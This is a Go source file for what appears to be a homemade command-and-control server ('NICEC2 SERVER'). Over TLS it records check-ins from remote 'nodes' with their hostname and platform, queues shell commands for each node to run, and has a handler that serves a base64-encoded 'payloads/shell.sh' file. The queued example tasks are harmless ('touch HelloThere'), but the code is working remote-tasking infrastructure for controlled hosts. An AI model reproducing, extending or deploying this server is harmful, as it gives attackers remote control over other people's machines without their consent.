package main

import (
	b64 "encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"
)

const banner string = `

███╗   ██╗██╗ ██████╗███████╗ ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
████╗  ██║██║██╔════╝██╔════╝██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██╔██╗ ██║██║██║     █████╗  ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║╚██╗██║██║██║     ██╔══╝  ██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
██║ ╚████║██║╚██████╗███████╗╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝ ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
                                                                                                  

`

// Command ID. This will keep going up as commands are added to the queue.
// It should never be bellow 0
var taskID int = 1

// type Command struct {
// 	CommandID string `json:"CommandID"`
// 	NodeID    string `json:"NodeID"`
// 	Action    string `json:"Action"`
// 	Content   string `json:"Command"`
// 	Progress  string `json:"Progress"`
// }

type Command struct {
	TaskID   string
	NodeID   string
	Action   string
	Content  string
	Progress string
}

type check_in struct {
	ID       string
	Hostname string
	Platform string
}

type node struct {
	ID             string
	Hostname       string
	Platform       string
	First_Check_In string
	Last_Check_In  string
}

// The main array of all nodes that have checked in.
var nodes []node = read_nodes_from_file()

var task_queue []Command

func nodeCheckIn(w http.ResponseWriter, req *http.Request) {

	var blank_response = string(`
	{
		"taskID": "0", 
		"task": "",  
		"arg" : ""
		
	}`)

	// Get's the current time
	dt := time.Now()

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node_that_checked_in check_in
	err := decoder.Decode(&node_that_checked_in)
	if err != nil {
		panic(err)
	}

	// Adding the node to the list (Needs to be only if new node)

	if is_new_node(node_that_checked_in.ID) == true {
		fmt.Println("Damn look it's a new node!")
		nodes = append(nodes, createNode(node_that_checked_in.ID, node_that_checked_in.Hostname, node_that_checked_in.Platform, dt.String()))
	} else {

		update_node(node_that_checked_in.ID, dt.String())

		fmt.Println("Node re-checked in")
	}

	// Output something pretty
	fmt.Println()
	fmt.Println("============= New Check in =============")

	fmt.Println("ID: " + node_that_checked_in.ID)
	fmt.Println("Hostname: " + node_that_checked_in.Hostname)
	fmt.Println("Platform: " + node_that_checked_in.Platform)
	fmt.Println("Time: " + dt.String())

	fmt.Println("============= ----------- =============")

	// response := "Hello World"

	// Send the response back
	// fmt.Fprintf(w, `{"message": "hello world"}`)

	// var response string

	// Find that nodes task
	Task_location, find_task_message := find_task(node_that_checked_in.ID)

	// This handles sending back a blank response if no task is found
	if find_task_message != "" {
		fmt.Println("No task for node")

		// Send the blank response back
		fmt.Fprintf(w, blank_response)

	} else {
		fmt.Println(Task_location)
		fmt.Println(find_task_message)

		fmt.Println("This is the task")
		fmt.Println(task_queue[Task_location])

		fmt.Println("This is what is going to be in the response: ")

		var response = string(`{"taskID": "` + task_queue[Task_location].TaskID + `", "task": "` + task_queue[Task_location].Action + `",  "arg": "` + task_queue[Task_location].Content + `"}`)

		fmt.Println(response)

		task_queue[Task_location].Progress = "Sent"

		// Send the response back
		fmt.Fprintf(w, response)
	}

	fmt.Println(task_queue)

	save_nodes_to_file()
}

func nodeSendFile(w http.ResponseWriter, req *http.Request) {

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node check_in
	err := decoder.Decode(&node)
	if err != nil {
		panic(err)
	}

	script := read_script("payloads/shell.sh")

	var response = []byte(`
	{
		"ID": "` + node.ID + `",
		"command": "File",
		"details": "` + script + `"
	}`)

	// Sending the reponse
	fmt.Fprintf(w, string(response))

}

func handleRequests() {

	// myRouter := mux.NewRouter().StrictSlash(true)

	// myRouter.HandleFunc("/test", shrug).Methods("GET")
	// myRouter.HandleFunc("/old-checkin", old_nodeCheckIn).Methods("POST")

	// myRouter.HandleFunc("/checkin", nodeCheckIn).Methods("POST")
	// myRouter.HandleFunc("/old-payload", nodeSendFile).Methods("POST")

	http.HandleFunc("/checkin", nodeCheckIn)
	// http.HandleFunc("/getPayload", getPayload)

	log.Fatal(http.ListenAndServeTLS(":8081", "server.crt", "server.key", nil))
}

func main() {

	// fmt.Println(command_id)
	// fmt.Println(create_task("hello", "there", "GEneral Kenobi"))
	// fmt.Println(command_id)
	// fmt.Println(create_task("hello", "there", "GEneral Kenobi"))
	// fmt.Println(command_id)
	// fmt.Println(create_task("hello", "there", "GEneral Kenobi"))
	// fmt.Println(command_id)
	// fmt.Println(create_task("hello", "there", "GEneral Kenobi"))
	// fmt.Println(command_id)
	// fmt.Println(banner)

	task_queue = append(task_queue, create_task("NodeName", "run", "This Command"))
	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touch HelloThere"))

	fmt.Println("The current task queue")
	fmt.Println(task_queue)
	fmt.Println()
	fmt.Println()

	handleRequests()

}

func refresh_commands() string {

	//Reading the command file, this will be JSON at some point I reckon

	bFile, _ := ioutil.ReadFile("command.txt")
	command := string(bFile)
	command = strings.Replace(command, "\n", "", -1)

	return command
}

func read_script(path string) string {

	// Read the file
	bFile, _ := ioutil.ReadFile(path)
	script := string(bFile)
	// script = strings.Replace(script, "\n", "", -1)

	// fmt.Println(script)

	// here is where we turn the file into some nice data I think
	encoded_script := b64.StdEncoding.EncodeToString([]byte(script))

	return encoded_script

}

////////////////////////////////////
/// Node slice  			    ////
////////////////////////////////////

func createNode(ID string, Hostname string, Platform string, Timestamp string) node {

	newNode := node{ID, Hostname, Platform, Timestamp, Timestamp}
	return newNode

}

func is_new_node(input_ID string) bool {

	for _, value := range nodes {
		if value.ID == input_ID {
			return false
		}
	}

	return true
}

// updates the node in the list
func update_node(ID string, Timestamp string) {

	node_position, error := find_node(ID)
	if error != "" {
		fmt.Println(error)
		return
	}

	nodes[node_position].Last_Check_In = Timestamp

}

// Finds a nodes position in the slice
func find_node(input_ID string) (int, string) {

	for i, value := range nodes {
		if value.ID == input_ID {
			return i, ""
		}
	}

	// returns 0 if it can't find anything.
	// pretty sure this small brain, but ehh
	return 0, "💀 Couldn't find node"
}

func display_all_nodes() {

	fmt.Println("")

	fmt.Println("[][][][][][][][][] Nodes [][][][][][][][][]")
	fmt.Println()
	for _, value := range nodes {
		fmt.Println("NodeID:        " + value.ID)
		fmt.Println("Hostname:      " + value.Hostname)
		fmt.Println("Platform:      " + value.Platform)
		fmt.Println("First Seen:    " + value.First_Check_In)
		fmt.Println("Last Seen:     " + value.Last_Check_In)
		fmt.Println("------------------ ===== ------------------")
	}
}

////////////////////////////////////
/// File Nonsense			    ////
////////////////////////////////////

func save_nodes_to_file() {
	out, _ := json.MarshalIndent(nodes, "", "  ")
	err := ioutil.WriteFile("nodes.json", out, 0644)
	if err != nil {
		fmt.Println(err.Error())
	}
}

func read_nodes_from_file() []node {
	fmt.Println("These are the nodes allready in the file")
	fmt.Printf("\n\n")
	content, err := ioutil.ReadFile("nodes.json")
	if err != nil {
		fmt.Println(err.Error())
	}

	var nodes []node
	err3 := json.Unmarshal(content, &nodes)
	if err3 != nil {
		fmt.Println("error with Unmarshal")
		fmt.Println(err3.Error())
	}

	for _, x := range nodes {
		fmt.Println(x.ID)
	}

	fmt.Printf("\n\n")
	return nodes
}

////////////////////////////////////
/// Task queue  			    ////
////////////////////////////////////

func create_task(node string, task string, arg string) Command {

	// Wouldn't want a small task ID
	taskID = taskID + 1

	// Not sure why i need to convert here, but 🤷‍♀️
	ID_string := strconv.Itoa(taskID)

	newCommand := Command{ID_string, node, task, arg, "Waiting"}

	return newCommand

}

// Finds a nodes position in the slice
func find_task(input_ID string) (int, string) {

	for i, value := range task_queue {

		if string(value.NodeID) == input_ID {
			return i, ""
		}
	}

	// returns 0 if it can't find anything.
	// pretty sure this small brain, but ehh
	return 0, "💀 Couldn't find node"
}
